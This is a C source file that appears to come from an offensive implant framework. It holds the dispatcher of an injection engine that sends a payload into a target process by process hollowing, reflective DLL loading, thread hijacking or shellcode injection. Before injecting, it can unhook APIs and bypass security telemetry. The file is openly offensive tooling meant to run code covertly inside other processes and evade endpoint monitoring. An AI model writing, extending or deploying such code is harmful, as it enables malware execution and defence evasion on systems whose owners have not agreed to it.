/* ============================================================================
 * Jockey's Execution Engine -- inject.c
 * Injection dispatcher with strict validation and clean error handling.
 * ============================================================================ */

#include "../include/injection.h"
#include "../include/pal.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ------------------------------------------------------------------ */
int inject_process(InjectionConfig* config) {
    if (!config) {
        LOG_ERROR("inject_process: null config");
        return JOCKEY_ERR_INVALID_PARAM;
    }

    if (config->method < INJECT_METHOD_PROCESS_HOLLOWING ||
        config->method > INJECT_METHOD_SHELLCODE) {
        LOG_ERROR("inject_process: invalid method %d", (int)config->method);
        return JOCKEY_ERR_INVALID_PARAM;
    }

    if (config->targetPid == 0U && (!config->targetImage || !config->targetImage[0])) {
        LOG_ERROR("inject_process: no target PID or image specified");
        return JOCKEY_ERR_INVALID_PARAM;
    }

    if (config->payload == NULL || config->payloadSize == 0U) {
        LOG_ERROR("inject_process: no payload provided");
        return JOCKEY_ERR_INVALID_PARAM;
    }

    if (config->targetPid != 0U && config->targetPid < 1U) {
        LOG_ERROR("inject_process: PID must be greater than zero");
        return JOCKEY_ERR_INVALID_PARAM;
    }

    LOG_INFO("Injection method: %d | Target PID: %lu | Direct Syscalls: %d | Unhook: %d",
             (int)config->method, (unsigned long)config->targetPid,
             config->useDirectSyscalls, config->unhookApi);

    if (config->unhookApi) {
        LOG_INFO("Pre-injection: unhooking APIs and bypassing telemetry...");
        if (bypass_telemetry() != JOCKEY_ERR_OK) {
            LOG_WARN("telemetry bypass reported a failure; continuing with injection");
        }
    }

    if (config->useDirectSyscalls) {
        pal_set_use_direct_syscalls(1);
    }

    switch (config->method) {
        case INJECT_METHOD_PROCESS_HOLLOWING:
            return perform_process_hollowing(config);
        case INJECT_METHOD_REFLECTIVE_DLL:
            return perform_reflective_injection(config);
        case INJECT_METHOD_THREAD_HIJACKING:
            return perform_thread_hijacking(config);
        case INJECT_METHOD_SHELLCODE:
            return perform_shellcode_injection(config);
        default:
            LOG_ERROR("Unknown injection method: %d", (int)config->method);
            return JOCKEY_ERR_INVALID_PARAM;
    }
}
